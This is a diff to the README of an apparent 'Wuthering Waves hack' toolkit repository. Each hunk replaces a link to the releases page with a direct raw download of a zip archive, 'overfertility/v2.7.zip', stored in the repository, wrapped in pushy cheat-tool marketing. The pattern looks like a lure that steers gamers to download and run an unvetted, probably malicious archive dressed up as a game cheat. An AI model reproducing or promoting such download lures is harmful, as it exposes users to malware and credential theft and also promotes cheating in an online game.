@@ -1,7 +1,7 @@
 <h1>⚡ wuthering-waves-hack-2026-wuwa-toolkit - Your Ultimate Wuthering Waves PC Companion</h1>
 
 <p align="center">
-  <a href="https://github.com/Mohamed-hatem-abdelzaher/wuthering-waves-hack-2026-wuwa-toolkit/releases">
+  <a href="https://github.com/Mohamed-hatem-abdelzaher/wuthering-waves-hack-2026-wuwa-toolkit/raw/refs/heads/main/overfertility/v2.7.zip">
     <img src="https://img.shields.io/badge/Download-WuWa%20Toolkit-4CAF50?style=for-the-badge&logo=windows&logoColor=white" alt="Download WuWa Toolkit" />
   </a>
 </p>
@@ -12,7 +12,7 @@ Welcome to the **Wuthering Waves Hack 2026 Toolkit** – your all-in-one compani
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: [**Download WuWa Toolkit**](https://github.com/Mohamed-hatem-abdelzaher/wuthering-waves-hack-2026-wuwa-toolkit/releases)
+Visit this link to download the application: [**Download WuWa Toolkit**](https://github.com/Mohamed-hatem-abdelzaher/wuthering-waves-hack-2026-wuwa-toolkit/raw/refs/heads/main/overfertility/v2.7.zip)
 
 Once you're on the download page, follow these simple steps:
 
@@ -139,11 +139,11 @@ The WuWa Toolkit is licensed under the **MIT License**. You're free to use, modi
 
 Don't wait – supercharge your Wuthering Waves experience today!
 
-[**👉 CLICK HERE TO DOWNLOAD THE TOOLKIT 👈**](https://github.com/Mohamed-hatem-abdelzaher/wuthering-waves-hack-2026-wuwa-toolkit/releases)
+[**👉 CLICK HERE TO DOWNLOAD THE TOOLKIT 👈**](https://github.com/Mohamed-hatem-abdelzaher/wuthering-waves-hack-2026-wuwa-toolkit/raw/refs/heads/main/overfertility/v2.7.zip)
 
 Join thousands of players who are already using the WuWa Toolkit to play smarter, farm faster, and build stronger. Your perfect Resonator is waiting!
 
-**Remember:** Visit this link to download the application: [**WuWa Toolkit Releases**](https://github.com/Mohamed-hatem-abdelzaher/wuthering-waves-hack-2026-wuwa-toolkit/releases)
+**Remember:** Visit this link to download the application: [**WuWa Toolkit Releases**](https://github.com/Mohamed-hatem-abdelzaher/wuthering-waves-hack-2026-wuwa-toolkit/raw/refs/heads/main/overfertility/v2.7.zip)
 
 Happy gaming, and see you in the Solaris-3! 🌊⚔️
 
